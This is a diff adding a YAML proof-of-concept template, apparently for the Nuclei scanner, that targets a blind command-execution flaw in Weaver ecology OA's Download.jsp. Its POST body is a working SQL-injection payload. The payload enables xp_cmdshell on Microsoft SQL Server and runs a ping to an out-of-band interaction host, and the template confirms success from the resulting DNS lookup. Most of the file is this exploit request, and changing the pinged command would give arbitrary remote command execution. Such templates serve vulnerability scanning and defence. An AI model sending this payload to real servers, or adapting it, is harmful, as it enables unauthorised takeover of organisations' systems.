@@ -1,0 +1,36 @@
+id: poc-local-oa-weaver-ecology-Download-jsp-exec
+
+info:
+  name: OA-泛微ecology-Download.jsp-无回显命令执行
+  author: capiton
+  severity: critical
+  tags: weaver,ecology,fanwei
+
+
+requests:
+  - method: POST
+    id: upload
+    path:
+      - "{{RootURL}}/mobile/plugin/Download.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "sessionkey=1%27%20EXEC%20sp_configure%20%27show%20advanced%20options%27,1%20RECONFIGURE%20EXEC%20sp_configure%20%27xp_cmdshell%27,1%20RECONFIGURE%20exec%20master..xp_cmdshell%20%27ping%20{{interactsh-url}}"
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+      # - type: word
+      #   part: body
+      #   condition: and   
+      #   words:  
+      #     - "{{md5_random}}"
+
+      # - type: dsl
+      #   condition: and   
+      #   dsl:
+      #     - "contains(body_2,md5_random)"
